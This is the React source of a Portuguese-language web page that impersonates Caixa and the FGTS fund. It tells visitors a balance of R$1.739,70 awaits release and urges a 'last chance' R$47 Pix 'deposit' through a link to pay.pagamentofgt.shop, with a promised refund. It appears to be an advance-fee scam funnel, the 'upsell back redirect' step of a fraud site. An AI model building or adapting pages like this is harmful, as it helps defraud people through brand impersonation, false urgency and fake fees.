
import { IoIosWarning, IoMdCheckmarkCircle } from "react-icons/io";
import logo from "../assets/caixalogo.png";
import logofgts from "../assets/fgts2.png";
import pix from "../assets/pix.png";

export function Upsellbackredirect() {
    return (
        <div className="min-h-screen flex flex-col items-center bg-gray-50 text-gray-900">


            {/* Cabeçalho */}
            <header className="flex w-full flex-col p-6 space-y-4 bg-[#025bab] shadow-lg">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="Logo Caixa" />
                        <span className="text-white font-semibold text-lg">
                            Última Oportunidade!
                        </span>
                    </div>
                    <img src={logofgts} alt="Logo FGTS" width={65} />
                </div>
            </header>

            {/* Conteúdo principal */}
            <main className="flex flex-col items-center justify-center text-center px-4 py-6 space-y-6 md:space-y-8">
                <h1 className="text-3xl font-bold text-red-600 leading-tight">
                    ATENÇÃO: ÚLTIMA CHANCE DE LIBERAR SEU SALDO
                </h1>

                <div className="flex items-center justify-center space-x-2 text-red-600">
                    <IoIosWarning size={80} />
                    <p className="text-lg font-medium">
                        Essa é sua última oportunidade para concluir a verificação de segurança.
                    </p>
                </div>

                <p className="text-lg text-gray-600 max-w-xl">
                    Para garantir a liberação do seu saldo, o valor do calção foi reduzido para apenas <strong>R$47,00</strong>.
                    Após essa etapa, você não terá outra chance de liberar o saldo do FGTS.
                </p>

                <h2 className="text-2xl font-semibold text-gray-800">
                    Não perca mais tempo: sua transação está quase concluída.
                </h2>

                <div className="my-6">
                    <p className="text-xl mb-2 text-gray-500">Valor disponível para saque:</p>
                    <p className="text-6xl font-semibold text-green-600">R$1.739,70</p>
                </div>

                {/* Botão de pagamento */}
                <a
                    href="https://pay.pagamentofgt.shop/meABG9yOye4G6Ea"
                    className="w-full"
                >
                    <button className="bg-red-500 text-xl w-full hover:bg-red-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 mt-6">
                        PAGAR R$47 E LIBERAR MEU SALDO
                    </button>
                </a>

                {/* Senso de urgência e explicação do Pix */}
                <div className="flex flex-col items-center mt-8 space-y-4">
                    <img src={pix} alt="Logo Pix" className="w-24 mt-4 mb-4" />
                    <p className="text-sm text-gray-600 flex items-center">
                        <IoMdCheckmarkCircle className="inline mr-2 text-green-500" />
                        Pagamento via Pix processado de forma rápida e segura.
                    </p>
                    <p className="text-xs text-gray-500 max-w-md">
                        Uma vez confirmado o pagamento, seu saldo será liberado em minutos. Esse valor será reembolsado após a conclusão do processo de verificação.
                    </p>
                </div>
            </main>
        </div>
    );
}
